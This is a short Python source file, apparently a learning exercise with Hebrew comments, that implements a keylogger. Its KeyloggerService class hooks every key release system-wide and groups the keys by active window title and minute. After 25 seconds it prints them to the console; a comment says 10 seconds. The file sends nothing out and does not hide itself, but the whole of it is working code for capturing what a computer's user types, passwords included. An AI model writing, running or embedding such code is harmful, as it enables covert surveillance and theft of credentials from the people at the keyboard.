import keyboard
from datetime import datetime
import pygetwindow as pw
import time


class KeyloggerService:

    def __init__(self):
        self.data = {}
        self.KEYS_DIC = {
            "Key.space": " ",
            "Key.esc": " Esc ",
            "Key.enter": "\n",
            "Key.backspace": " backspace ",
            "Key.tab": " tab ",
            "Key.shift": " shift ",
            "Key.shift_r": " shift ",
            "Key.ctrl_l": " ctrl ",
            "Key.ctrl_r": " ctrl ",
            "Key.alt_l": " alt ",
            "Key.alt_gr": " alt ",
            "Key.cmd": " cmd ",
            "Key.caps_lock": " caps_lock ",
            # "Key.f1": " f1 ",
            # "Key.f2": " f2 ",
            # "Key.f3": " f3 ",
            # "Key.f4": " f4 ",
            # "Key.f5": " f5 ",
            # "Key.f6": " f6 ",
            # "Key.f7": " f7 ",
            # "Key.f8": " f8 ",
            # "Key.f9": " f9 ",
            # "Key.f10": " f10 ",
            # "Key.f11": " f11 ",
            # "Key.f12": " f12 ",
            "Key.insert": " insert ",
            "Key.delete": " delete ",
            "Key.home": " home ",
            "Key.end": " end ",
            # "Key.page_up": " page_up ",
            # "Key.page_down": " page_down ",
            "Key.left": " left_arrow ",
            "Key.right": " right_arrow ",
            "Key.up": " up_arrow ",
            "Key.down": " down_arrow ",
            "Key.num_lock": " num_lock ",
            "Key.print_screen": " print_screen ",
            "Key.scroll_lock": " scroll_lock ",
            "Key.pause": " pause ",
        }

    def getKeyWord(self):
        def callback(event):
            eventName = event.name
            current_time = self.getTime(event)
            activeWindow = self.getWindowName()

            if activeWindow not in self.data:
                self.data[activeWindow] = {}
            if current_time not in self.data[activeWindow]:
                self.data[activeWindow][current_time] = []
            self.data[activeWindow][current_time].append(eventName)

        keyboard.on_release(callback)

    def getData(self):
        print("\nData collected:")
        for window, timestamps in self.data.items():
            print(f"\n window: {window}")
            for time, keys in timestamps.items():
                print(f"\ttime: {time}")
                for key in keys:
                    print(f"\t\t{self.format_key(key)}")

            # מחברים את כל התווים למחרוזת אחת
            # all_keys = "".join("".join(keys).replace("space"," ") for keys in timestamps.values())
            #
            # # מחלקים למילים לפי רווחים
            # words = all_keys.split()
            #
            # # מחברים מחדש עם רווח אחד בין המילים
            # formatted_text = " ".join(words)
            #
            # print(formatted_text)

    def format_key(self, key):
        key = str(key).strip("'")

        if key in self.KEYS_DIC.keys():
            return self.KEYS_DIC[key]
        else:
            return key

    def getWindowName(self):
        return pw.getActiveWindowTitle() or "Unknown Window"

    def getTime(self, event):
        return datetime.fromtimestamp(event.time).strftime("%Y-%m-%d %H:%M")


# יצירת מופע והפעלת ההאזנה
keylogger = KeyloggerService()
keylogger.getKeyWord()

# מחכים 10 שניות כדי לאסוף נתונים ואז מדפיסים

time.sleep(25)

# הדפסת הנתונים שנאספו
keylogger.getData()

#  Saay my name
